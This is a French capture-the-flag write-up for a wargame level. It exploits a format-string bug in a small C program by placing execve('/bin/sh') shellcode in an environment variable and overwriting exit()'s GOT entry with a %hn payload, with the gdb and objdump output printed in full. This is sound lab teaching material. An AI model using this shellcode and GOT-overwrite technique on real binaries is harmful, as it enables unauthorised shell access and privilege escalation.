# Level 05

Voici le code source de ce niveau:

```C
#include <ctype.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void main(void)
{
    char buff[100];

    fgets(buff, 100, stdin);
    for (size_t i = 0; i < strlen(buff); i++)
        if (buff[i] >= 'A' && buff[i] <= 'Z')
            buff[i] = tolower(buff[i]);
    printf(buff);
    exit(0);
}
```

L'idee ici est d'executer un shellcode en remplacant l'adresse de `exit()` dans la GOT. Voici comment avoir l'adresse de `exit()`:

```bash
level05@OverRide:~$ objdump -R ./level05 

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```

Nous pouvons mettre notre shellcode dans une variable d'environement:

```bash
export SHELLCODE=$(python -c 'print "\x90" * 50 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

Ensuite il nous faut trouver l'adresse de notre variable d'environement dans notre programme:

```bash
level05@OverRide:~$ gdb ./level05 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x8048449
(gdb) run
Starting program: /home/users/level05/level05 

Breakpoint 1, 0x08048449 in main ()
(gdb) x/20s *((char **)environ)
0xffffd8a3:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
```

Maintenant nous allons utiliser `printf()` pour ecraser l'adresse de `exit()`. Il nous faut trouver la position de ce qu'on veut envoyer a `printf()` dans la stack:

```bash
level05@OverRide:~$ python -c 'print "aaaa" + " %x" * 15' | ./level05 
aaaa 64 f7fcfac0 f7ec3add ffffd69f ffffd69e 0 ffffffff ffffd724 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825
```

Nous voyons donc que notre argument est en 10eme position dans la stack. Donc nous pouvons construire notre payload:

```bash
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55467d%10$hn" + "%10060d%11$hn"' ; cat) | ./level05
```
